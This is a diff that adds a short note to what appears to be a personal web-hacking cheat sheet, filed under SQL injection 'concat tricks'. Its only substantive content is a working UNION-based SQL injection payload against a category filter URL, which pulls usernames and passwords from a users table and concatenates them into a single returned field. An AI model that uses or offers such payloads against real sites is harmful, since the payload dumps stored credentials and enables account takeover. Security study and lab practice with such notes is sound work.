@@ -1,0 +1,5 @@
+
+[ WEB > SQLI > CONCAT TRICKS ]
+
+// Concat usernames and passwords into a single field:
+/filter?category=Pets' union select null,username||'~'||password from users--
